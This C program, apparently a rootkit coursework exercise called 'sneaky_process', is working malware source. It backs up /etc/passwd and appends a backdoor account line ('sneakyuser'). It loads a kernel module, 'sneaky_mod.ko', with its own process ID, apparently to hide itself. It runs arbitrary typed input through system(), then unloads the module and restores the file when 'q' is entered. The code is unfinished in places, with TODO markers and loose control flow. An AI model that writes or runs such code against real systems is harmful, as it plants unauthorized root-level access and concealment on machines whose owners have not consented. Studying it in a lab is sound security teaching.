#include <stdio.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(void){
	int myPID = getpid();
	printf("sneaky_process pid=%d\n", myPID);
	int main_pid = fork();

	switch (main_pid){
		case -1: 
			printf("Fork failed!\n");
			break;
		case 0: ;//fork a second time and handle modifying /etc/passwd files
			int file_mod_pid = fork();
			
			switch(file_mod_pid){
				case -1:
					printf("file_mod fork failed!\n");
					break;
				case 0: 
					//copy the /etc/passwd file to a new file /tmp/passwd
					//open the /etc/passwd file and print a new line to the end of the file that contains
					//sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
					printf("copying passwd file\n");
					char *cmd1[] = {"cp", "/etc/passwd", "/tmp/passwd", 0}; //'cp /etc/passwd /tmp/passwd' cmd
					execvp(cmd1[0], cmd1);
					exit(0);
				default:
					//wrtie new lines to /etc/passwd
					waitpid(file_mod_pid, NULL, 0);
					printf("TODO: write new lines to /etc/passwd\n");
					int fd;
					char * abs_path = "/etc/passwd";
					char * sneakyuser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
					if ((fd = open(abs_path, O_WRONLY | O_APPEND, S_IRUSR | S_IRGRP | S_IROTH)) == -1){
						perror("Cannot open output file\n"); exit(1);
					}
					write(fd, sneakyuser, strlen(sneakyuser));
					printf("/etc/passwd modified\n");
					close (fd);
					exit(0); 
			}

		default:; //Handle kernel insertion and removal here
			int kernel_mod_pid = fork();
			switch(kernel_mod_pid){
				case -1:
					printf("kernel_mod fork failed!\n");
					break;
				case 0: 
					//Load kernel here
					printf("TODO: insmod kernel\n");
					//TODO: verify this is working
					char arg[1024];
					sprintf(arg, "myPID=%d", myPID);
					char *insmod[] = {"insmod", "sneaky_mod.ko", arg, 0};
					execvp(insmod[0], insmod);
					exit(0);
				default:
					;//LOOP KEY INPUTS HERE AND QUIT WHEN "Q" IS RECEIVED
					char word[256];
					while(1){
						if(fgets(word, sizeof(word), stdin) != NULL){
							//printf("INPUT: %s\n", word);
							char * tmp = malloc(sizeof(word));
							strcpy(tmp, word);
							//printf("TMP: %s\n", tmp);
							if(strcmp(tmp, "q\n") == 0 || strcmp(tmp, "Q\n") == 0){
								//printf("Q FOUND Input: %s\n", tmp);
								printf("TODO: unload kernel and restore passwd file\n");
								
								int cleanup_pid = fork();
								switch(cleanup_pid){
									case -1:
										printf("failed to cleanup!\n");
										break;
									case 0:
										//Remove kernel here
										printf("TODO: rmmod kernel\n");
										//TODO: verify this is working
										char *rmmod[] = {"rmmod", "sneaky_mod.ko", 0};
										execvp(rmmod[0], rmmod);
										exit(0);
									default:
										printf("restoring /tmp/passwd file\n");
										char *cp_cmd[] = {"cp", "/tmp/passwd", "/etc/passwd", 0}; //'rm /etc/passwd' cmd
										waitpid(cleanup_pid, NULL, 0);
										execvp(cp_cmd[0], cp_cmd);
										exit(0);
								}
								exit(0);
							}
							int ret = system(tmp);
							free(tmp);
						}
					}
			}
	}
	return 0;
}
